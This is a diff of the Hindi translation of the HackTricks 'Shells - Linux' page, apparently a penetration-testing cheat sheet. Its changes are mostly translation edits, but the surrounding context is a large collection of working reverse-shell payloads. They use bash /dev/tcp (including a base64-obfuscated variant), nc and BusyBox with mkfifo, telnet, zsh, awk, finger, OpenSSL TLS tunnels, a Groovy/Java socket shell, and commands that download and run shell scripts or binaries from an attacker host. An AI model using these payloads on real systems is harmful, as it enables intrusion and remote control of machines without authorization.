@@ -1,12 +1,14 @@
 # Shells - Linux
 
-**यदि आपको इनमें से किसी भी shell के बारे में प्रश्न हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com/) **से जाँच सकते हैं।**<sup>[[9]](#references)</sup>
+{{#include ../../banners/hacktricks-training.md}}
+
+**यदि आपको इनमें से किसी भी shell के बारे में प्रश्न हैं, तो आप उन्हें** [**https://explainshell.com/**](https://explainshell.com/) **पर जाँच सकते हैं।**<sup>[[9]](#references)</sup>
 
 ## Full TTY
 
-**जब आपको reverse shell मिल जाए, तो**[ **पूर्ण TTY प्राप्त करने के लिए यह पेज पढ़ें**](full-ttys.md)**।**
+**एक reverse shell प्राप्त करने के बाद**[ **पूर्ण TTY प्राप्त करने के लिए यह पेज पढ़ें**](full-ttys.md)**।**
 
-नीचे एकत्र किए गए baseline reverse-shell payloads को HighOn.Coffee और PayloadsAllTheThings cheat sheets में भी documented किया गया है; किसी एक को चुनने से पहले target पर interpreter और utility की उपलब्धता verify करें।<sup>[[1]](#references)[[4]](#references)</sup>
+नीचे एकत्र किए गए baseline reverse-shell payloads को HighOn.Coffee और PayloadsAllTheThings cheat sheets में भी document किया गया है; किसी एक का चयन करने से पहले target पर interpreter और utility की उपलब्धता verify करें।<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## Bash | sh
 ```bash
@@ -21,7 +23,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-अन्य shells के साथ भी जाँच करना न भूलें: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, और bash।
+अन्य shells के साथ भी जांच करना न भूलें: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, और bash।
 
 ### Symbol safe shell
 ```bash
@@ -32,17 +34,17 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Shell explanation
+#### Shell का विवरण
 
 निम्नलिखित बिंदु Bash के documented interactive और redirection behavior का सारांश देते हैं:<sup>[[10]](#references)[[11]](#references)</sup>
 
-1. **`bash -i`**: कमांड का यह भाग एक interactive (`-i`) Bash shell शुरू करता है।
-2. **`>&`**: कमांड का यह भाग **standard output** (`stdout`) और **standard error** (`stderr`) दोनों को **एक ही destination** पर **redirect करने** के लिए shorthand notation है।
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक विशेष file है जो **निर्दिष्ट IP address और port से TCP connection को represent करती है**।
-- **Output और error streams को इस file पर redirect करने** से कमांड प्रभावी रूप से interactive shell session का output attacker की machine पर भेजती है।
-4. **`0>&1`**: कमांड का यह भाग **standard input (`stdin`) को standard output (`stdout`) के समान destination पर redirect करता है**।
+1. **`bash -i`**: command का यह भाग एक interactive (`-i`) Bash shell शुरू करता है।
+2. **`>&`**: command का यह भाग **standard output** (`stdout`) और **standard error** (`stderr`) दोनों को **एक ही destination** पर **redirect करने** के लिए shorthand notation है।
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: यह एक special file है जो **निर्दिष्ट IP address और port से TCP connection को represent करती है**।
+- **output और error streams को इस file पर redirect करने** से command प्रभावी रूप से interactive shell session का output attacker की machine पर भेजती है।
+4. **`0>&1`**: command का यह भाग **standard input (`stdin`) को उसी destination पर redirect करता है जिस पर standard output (`stdout`) है**।
 
-### File में बनाएं और execute करें
+### File में create करके execute करें
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
@@ -51,9 +53,9 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 जब RCE उपलब्ध हो, लेकिन firewall, NAT या outbound filtering के कारण reverse shell blocked हो, तो RCE channel पर forward shell एक semi-interactive session प्रदान कर सकता है।<sup>[[12]](#references)</sup>
 
-इस उद्देश्य के लिए [toboggan](https://github.com/n3rada/toboggan.git) एक recommended tool है, जो command-execution primitive को एक interactive session में wrap करता है।<sup>[[12]](#references)</sup>
+इस उद्देश्य के लिए [toboggan](https://github.com/n3rada/toboggan.git) एक recommended tool है, जो command-execution primitive को interactive session में wrap करता है।<sup>[[12]](#references)</sup>
 
-toboggan का उपयोग करने के लिए अपने target system के RCE context के अनुसार एक Python module बनाएं; इसका module interface `execute(command, timeout)` function की अपेक्षा करता है, जो command output return करता है।<sup>[[12]](#references)</sup> उदाहरण के लिए, `nix.py` नामक module को इस प्रकार structured किया जा सकता है:
+toboggan का उपयोग करने के लिए, अपने target system के RCE context के अनुसार एक Python module बनाएं; इसका module interface `execute(command, timeout)` function की अपेक्षा करता है, जो command output लौटाता है।<sup>[[12]](#references)</sup> उदाहरण के लिए, `nix.py` नामक module की संरचना इस प्रकार हो सकती है:
 ```python3
 import jwt
 import httpx
@@ -77,11 +79,11 @@ response.raise_for_status()
 
 return response.text
 ```
-मॉड्यूल को toboggan के वर्तमान command-line form के साथ चलाएँ:<sup>[[12]](#references)</sup>
+toboggan के वर्तमान command-line form का उपयोग करके module चलाएँ:<sup>[[12]](#references)</sup>
 ```shell
 toboggan nix.py
 ```
-यह interactive session शुरू करता है। built-in Burp Suite backend के लिए, `toboggan --request burp_request.xml` का उपयोग करें; command-wrapper backend के लिए, `toboggan --exec-wrapper '<command_template>'` का उपयोग करें।<sup>[[12]](#references)</sup>
+यह interactive session शुरू करता है। Built-in Burp Suite backend के लिए, `toboggan --request burp_request.xml` का उपयोग करें; command-wrapper backend के लिए, `toboggan --exec-wrapper '<command_template>'` का उपयोग करें।<sup>[[12]](#references)</sup>
 
 एक अन्य संभावना `IppSec` forward-shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) है।<sup>[[13]](#references)</sup>
 
@@ -103,13 +105,13 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-BusyBox कई utilities को एक छोटे executable में संयोजित करता है और छोटे या embedded Linux systems पर आम है। यदि standalone `nc` उपलब्ध नहीं है, तो जांचें कि क्या BusyBox इसे expose करता है:<sup>[[8]](#references)[[19]](#references)</sup>
+BusyBox कई utilities को एक छोटे executable में संयोजित करता है और छोटे या embedded Linux systems में आम है। यदि कोई standalone `nc` न हो, तो जांचें कि क्या BusyBox इसे उपलब्ध कराता है:<sup>[[8]](#references)[[19]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-यदि `busybox nc` मौजूद है, लेकिन interactive execution अस्थिर है, तो `nc` section के FIFO pattern को उस applet के अनुसार अनुकूलित करें:<sup>[[2]](#references)[[8]](#references)</sup>
+यदि `busybox nc` मौजूद है लेकिन interactive execution अस्थिर है, तो `nc` section के FIFO pattern को उस applet के अनुसार अनुकूलित करें:<sup>[[2]](#references)[[8]](#references)</sup>
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
@@ -132,7 +134,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Whois section में वर्णित उसी Enter/CTRL+D input sequence का उपयोग करें।<sup>[[3]](#references)</sup>
+Whois section में वर्णित वही Enter/CTRL+D input sequence का उपयोग करें।<sup>[[3]](#references)</sup>
 
 **पीड़ित**
 ```bash
@@ -233,7 +235,7 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
-## Zsh (अंतर्निहित TCP)
+## Zsh (built-in TCP)
 ```bash
 # Requires no external binaries; leverages zsh/net/tcp module
 zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
@@ -251,7 +253,7 @@ curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-l
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 Project द्वारा documented features में शामिल हैं:<sup>[[5]](#references)</sup>
-- Interactive mode में command history और tab completion
+- Interactive mode में Command history और tab completion
 - `connect` द्वारा उपयोग किए जाने वाले shell executable को चुनने के लिए `-s`
 
 ## pwncat-cs
@@ -265,11 +267,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-यह **encrypted** `ssl-bind` और `ssl-connect` channels को भी support करता है, इसलिए transport encryption की आवश्यकता होने पर आप इसे `ncat --ssl` या `socat OPENSSL:` payloads के साथ pair कर सकते हैं।<sup>[[7]](#references)</sup>
+यह **encrypted** `ssl-bind` और `ssl-connect` channels को भी support करता है, इसलिए जब आपको transport encryption की आवश्यकता हो, तो आप इसे `ncat --ssl` या `socat OPENSSL:` payloads के साथ pair कर सकते हैं।<sup>[[7]](#references)</sup>
 
 ## revsh (encrypted & pivot-ready)
 
-`revsh` एक छोटा C client/server है, जो **encrypted Diffie-Hellman tunnel** के ज़रिए full TTY प्रदान करता है और reverse VPN-like pivoting के लिए वैकल्पिक रूप से एक **TUN/TAP** interface attach कर सकता है।<sup>[[6]](#references)</sup>
+`revsh` एक छोटा C client/server है, जो **encrypted Diffie-Hellman tunnel** के ऊपर full TTY प्रदान करता है और reverse VPN-like pivoting के लिए वैकल्पिक रूप से एक **TUN/TAP** interface attach कर सकता है।<sup>[[6]](#references)</sup>
 ```bash
 # Build after preparing the OpenSSL dependency as described in the repository README
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -280,23 +282,23 @@ revsh -c 0.0.0.0:443
 # Victim – reverse shell over the encrypted tunnel
 ./revsh <ATTACKER-IP>:443
 ```
-`revsh` में documented उपयोगी flags:<sup>[[6]](#references)</sup>
+`revsh` में documented उपयोगी flags में शामिल हैं:<sup>[[6]](#references)</sup>
 - `-b`: bind-shell mode (इसे दोनों ends पर enable करें)
 - `-D [LHOST:]LPORT` या `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
-- `-x`: proxies के automatic setup को disable करें, जिसमें default TUN/TAP setup भी शामिल है
+- `-x`: proxies का automatic setup disable करें, जिसमें default TUN/TAP setup भी शामिल है
 
-Encrypted tunnel shell traffic को plaintext के रूप में expose होने से बचाता है, लेकिन यह अपने-आप network policy को bypass नहीं करता।<sup>[[6]](#references)</sup>
+यह encrypted tunnel shell traffic को plaintext के रूप में expose होने से बचाता है, लेकिन यह अपने आप network policy को bypass नहीं करता।<sup>[[6]](#references)</sup>
 
 ## OpenSSL
 
-यह section certificate बनाने और TLS पर shell carry करने के लिए OpenSSL के `req`, `s_server` और `s_client` commands का उपयोग करता है।<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+यह section certificate बनाने और TLS पर shell ले जाने के लिए OpenSSL के `req`, `s_server`, और `s_client` commands का उपयोग करता है।<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
-The Attacker (Kali)
+हमलावर (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
 ```
-Victim
+पीड़ित
 ```bash
 #Linux - one-port TLS shell using a named pipe
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
@@ -304,7 +306,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 #If the target needs SNI / hostname validation to blend with a fronted TLS service
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
-जब आपको input/output channels को अलग रखना हो, तब भी आप classic **two-listener** pattern का उपयोग कर सकते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
+जब आपको अलग-अलग इनपुट/आउटपुट चैनल चाहिए हों, तब भी आप पारंपरिक **two-listener** pattern का उपयोग कर सकते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -332,13 +334,13 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```
 ## Finger
 
-**आक्रमणकर्ता**
+**हमलावर**
 ```bash
 while true; do nc -l 79; done
 ```
-Command भेजने के लिए उसे लिखें, Enter दबाएं और STDIN को रोकने के लिए CTRL+D दबाएं।<sup>[[3]](#references)</sup>
+कमांड भेजने के लिए उसे लिखें, Enter दबाएँ और STDIN को रोकने के लिए CTRL+D दबाएँ।<sup>[[3]](#references)</sup>
 
-**पीड़ित**
+**Victim**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -369,11 +371,11 @@ close(Service)
 ```
 ## Xterm
 
-यह port 6001 पर आपके system से connect करने का प्रयास करेगा।<sup>[[2]](#references)</sup>
+यह आपके system से port 6001 पर connect करने का प्रयास करेगा।<sup>[[2]](#references)</sup>
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Reverse shell को पकड़ने के लिए, नीचे दिखाए गए अनुसार port 6001 पर सुनने वाले X server का उपयोग करें।<sup>[[2]](#references)</sup>
+reverse shell पकड़ने के लिए, नीचे दिखाए अनुसार port 6001 पर listening करने वाले X server का उपयोग करें।<sup>[[2]](#references)</sup>
 ```bash
 # Authorize host
 xhost +targetip
@@ -382,7 +384,7 @@ Xnest :1
 ```
 ## Groovy
 
-द्वारा [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)। ध्यान दें: Java reverse shell, Groovy के लिए भी काम करता है।<sup>[[18]](#references)</sup>
+द्वारा [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)। नोट: Java reverse shell भी Groovy के लिए काम करता है।<sup>[[18]](#references)</sup>
 ```bash
 String host="localhost";
 int port=8044;
@@ -404,7 +406,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [11] [Bash Reference Manual: Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
 - [12] [toboggan](https://github.com/n3rada/toboggan)
 - [13] [forward-shell](https://github.com/IppSec/forward-shell)
-- [14] [Global Socket deployment instructions](https://www.gsocket.io/deploy/)
+- [14] [Global Socket deployment निर्देश](https://www.gsocket.io/deploy/)
 - [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
 - [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
 - [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
